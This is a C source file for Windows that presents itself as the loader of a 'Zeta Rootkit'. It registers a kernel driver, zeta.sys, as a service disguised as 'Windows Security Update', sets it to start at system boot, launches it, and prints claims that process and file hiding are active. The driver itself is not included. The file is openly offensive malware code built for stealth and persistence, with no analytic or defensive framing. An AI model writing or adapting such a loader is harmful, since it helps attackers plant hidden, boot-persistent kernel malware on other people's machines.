#include <windows.h>
#include <stdio.h>

int main() {
    SC_HANDLE scm, service;
    
    printf("Zeta Rootkit Loader - Maximum Stealth Mode 🚀\n");
    
    // Open Service Control Manager
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        printf("[!] Failed to open SCM: %d\n", GetLastError());
        return 1;
    }
    
    // Create service
    service = CreateServiceA(
        scm, "ZetaRootkit", "Windows Security Update",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_SYSTEM_START, SERVICE_ERROR_IGNORE,
        "C:\\Windows\\System32\\drivers\\zeta.sys", NULL, NULL, NULL, NULL, NULL
    );
    
    if (!service) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            service = OpenServiceA(scm, "ZetaRootkit", SERVICE_ALL_ACCESS);
        } else {
            printf("[!] Failed to create service: %d\n", GetLastError());
            CloseServiceHandle(scm);
            return 1;
        }
    }
    
    // Start service
    if (!StartService(service, 0, NULL)) {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[!] Failed to start service: %d\n", GetLastError());
        }
    }
    
    printf("[+] Zeta Rootkit loaded successfully! 💀\n");
    printf("[+] Process hiding active\n");
    printf("[+] File hiding active\n");
    printf("[+] Maximum stealth engaged!\n");
    
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    
    return 0;
}